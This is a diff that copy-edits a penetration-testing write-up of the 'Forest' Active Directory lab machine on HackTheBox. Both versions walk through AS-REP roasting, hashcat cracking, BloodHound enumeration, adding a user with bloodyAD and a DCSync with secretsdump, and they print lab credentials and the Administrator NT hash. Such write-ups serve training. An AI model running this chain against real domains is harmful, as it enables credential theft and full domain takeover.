@@ -4,17 +4,16 @@
 
 # Intro
 
-Forest was my first AD machine after completed the CPTS path of HTB.
-It's a well known machine for getting started with Active Directory environments. It is an easy-rated machine. The pentest is performed in a black box context as we have no credentials, only the machine's IP address.
-I started by a ASREP-Roasting and found that `svc_alfresco` do not requirer Kerberos pre-auth and succesfuly cracked offline his TGT.
-After that I used his account to harvest all the domain ACLs and discovered that `svc_alfresco` is a part of the `Account Operators` which has the `GenericAll` over the `Exchange Windows Permissions`.
-This group has the `DCSync` ACL over the domain. So I performed a DCSync attack to recover the `Administrator` NT hash and fully compromised the domain
+Forest was my first AD machine after completing the CPTS path of HTB.
+It's a well-known machine for getting started with Active Directory environments. It is an easy-rated machine. The pentest was performed in a black box context as I had no credentials, only the machine's IP address.
+I started with an **ASREP-Roasting** and discovered that the `svc_alfresco` user did not require Kerberos pre-authentication.  I was able to successfully crack its TGT offline.
+Using this account, I enumerated the domain's ACLs and found that svc_alfresco, through several groups, was a member of the `Account Operators` group. This group held `GenericAll` privileges over the `Exchange Windows Permissions` group and had permission to add users in the domain. Since the Exchange Windows Permissions group has DCSync rights, I leveraged my Account Operators privileges to create a new user and add it to that group. This allowed me to perform a DCSync attack with the new user's credentials, retrieve the Administrator's NTLM hash, and fully compromise the domain.
 
 # Walkthough
 
 ## Enumeration
 
-I began to enumerate services on the host with the `nmap` tool.
+I start by enumerating services on the host with the **nmap** tool.
 
 ```bash
  # nmap -sV -sC -p- -T5 10.129.62.73
@@ -74,8 +73,8 @@ Host script results:
 |_  start_date: 2025-10-15T08:53:18
 ```
 
-Kerberos and LDAP services are exposed on the host, which leads to conclude that this is a Domain Controller within an Active Directory environment.
-The domain name is `htb.local` and The DC FQDN is `FOREST.htb.local`.
+Kerberos and LDAP services are exposed on the host, which indicates that this is a domain controller within an Active Directory environment.
+The domain name is `htb.local` and the DC FQDN is `FOREST.htb.local`.
 
 I added this information to /etc/hosts.
 
@@ -83,10 +82,10 @@ I added this information to /etc/hosts.
 # echo '10.129.62.73 htb.local FOREST.htb.local FOREST' >> /etc/hosts 
 ```
 
-## Kerberoasting `svc-alfresco`
+## AS-REP Roasting `svc-alfresco`
 
-It seems like nmap was able to retrieve several information, maybe smb is accessible from an anonymous connexion.
-Let's confirm that with NetExect.
+It seems like nmap was able to retrieve a lot of information, maybe SMB is accessible via an anonymous connection.
+Let's confirm that with **NetExec**.
 
 ```bash
 # nxc smb FOREST.htb.local -u '' -p ''
@@ -94,7 +93,7 @@ SMB         10.129.62.73    445    FOREST           [*] Windows 10 / Server 2016
 SMB         10.129.62.73    445    FOREST           [+] htb.local\:
 ```
 
-It's confirmed, it is the same for ldap?
+It's confirmed! Is it the same for LDAP?
 
 ```bash
 nxc ldap FOREST.htb.local -u '' -p ''
@@ -102,7 +101,7 @@ LDAP        10.129.62.73    389    FOREST           [*] Windows 10 / Server 2016
 LDAP        10.129.62.73    389    FOREST           [+] htb.local\:
 ```
 
-Yes! So whith that, we can perfrom an AS-REP Roast attack to request a user TGT without his password.
+Yes! So with that, I can perform an **AS-REP Roasting** attack to request a user's TGT without their password.
 
 ```bash
 # nxc ldap 10.129.62.73 -u '' -p '' --asreproast asreproast.txt
@@ -112,11 +111,11 @@ LDAP        10.129.62.73    389    FOREST           [*] Total of records returne
 LDAP        10.129.62.73    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:68342ef59bc941531618bb589cedd8b9$703ea2b719fbf84824611c4a36e59852274e2965faea332486dd5a722303a807aa6725bb329781f67eb5658f04b87d2ff9053d1840c47838b432d96101ca7dd50251a8c3d5c43a7835d5738ab027807d30692966ead77e33e4011fe47bb7a073a347afd640a2016bda5bdde0c0b96e5c08cd6019867d784be570a5796c7f238fd28cbd0defb930880719502dfd430d47bfe86c1a18de199a44a5163b11eddc794ef682f8d16c807c6b2bbc621a43506a4f5bbea0fc499c92f9f82b37f9e0a0689c938ac1e1cdd6a4dfff8bfe16c88965469cc3b8c89ef41655f9b8999dd3ab73885b7e083452
 ```
 
-Here is the hash! Notice that no userlist is necessary because the null session is allowed and the tool enumerate first the usernames and make the AS-REQ automaticaly for each users.
+Here is the hash! Notice that no userlist is necessary because the null session is allowed, and the tool enumerates the usernames first and makes the AS-REQ automatically for each user.
 
 ## Cracking `svc-alfresco` hash
 
-I tried to crack this AS-REP hash with `Hashcat` to revael the `svc-alfresco` password.
+Now, I'll use **Hashcat** to crack this AS-REP hash and reveal the `svc-alfresco` password.
 
 ```bash
 # hashcat -m 18200 asreproast.txt /opt/lists/rockyou.txt       
@@ -128,35 +127,34 @@ Status...........: Cracked
 Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
 ```
 
-The hash is cracked! I have a first domain credential:
-`svc-alfreso:s3rvice`
+The hash is cracked! I have my first domain credential:
+`svc-alfresco:s3rvice`
 
 ## Enumerating ACLs with Bloodhound
 
-I used `bloodhound.py` to dumps all ACLs of 
+I used **bloodhound-python** to dump all ACLs of the domain.
 
 ```bash
 # # bloodhound.py --zip -c All -u 'svc-alfresco' -p 's3rvice' -dc FOREST.htb.local -d htb.local -ns 10.129.62.73
 ```
 
-Let's check with `Bloodhound` the attacks path I have from `svc-alfresco`.
+Let's check the attacks paths I have from `svc-alfresco` with `Bloodhound`.
 
 ![](img/svc-alfresco.png)
 
-This account, through several groups, is a part of the powerfull `Account Operators` group. 
-This group have permissions to create, modify, and delete most user accounts, groups, and computers, with the exception of administrative accounts and groups.
-Moreover I see that `Account Operators` has the `GenericAll` ACL over the `Exchange Windows Permissions` group.
+Through nested memberships, this account is a member of the powerful `Account Operators` group. 
+This group has permissions to manage most non-administrative accounts and groups.
+More importantly, I see that the `Account Operators` group holds `GenericAll` privileges over the `Exchange Windows Permissions` group.
 
 ![](img/exchangeWindowsPermissions.png)
 
 This group has the `WriteDacl` over the `htb.local` domain!
-
-Here the path is clear, I'll create a new user and add it to `Exchange Windows Permissions` group. After that, I'll add the DCSync ACL to `svc-alfresco` over `htb.local` domain.
+The path forward is clear: I'll create a new user and add it to the `Exchange Windows Permissions` group. After that, I'll add the DCSync ACL to my new user over `htb.local` domain.
 Finally, I'll perform a DCSync attack to recover the `Administrator` hash to compromise the domain.
 
 ## Creating a new user
 
-I use the `Bloody-AD` tool for all steps.
+I use the `Bloody-AD` tool for all these steps.
 
 ```bash
 # bloodyAD --host "FOREST.htb.local" -d "htb.local" -u "svc-alfresco" -p "s3rvice" add user m3ringue 'Bagu3tte!'
@@ -180,14 +178,14 @@ I use the `Bloody-AD` tool for all steps.
 ## Performing the DCSync attack
 
 ```bash
-# secretsdump -just-dc-user administrator htb.local/m3ringue:B4guette@10.10.10.161
+# secretsdump -just-dc-user administrator htb.local/m3ringue:'Bagu3tte!'@FOREST.htb.local
 Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
 ```
-The administrator password NT hash is dumped!
+The administrator's password NT hash has been dumped!
 `Administrator:32693b11e6aa90eb43d32c72a07ceea6`
 
 ## Connecting to the DC
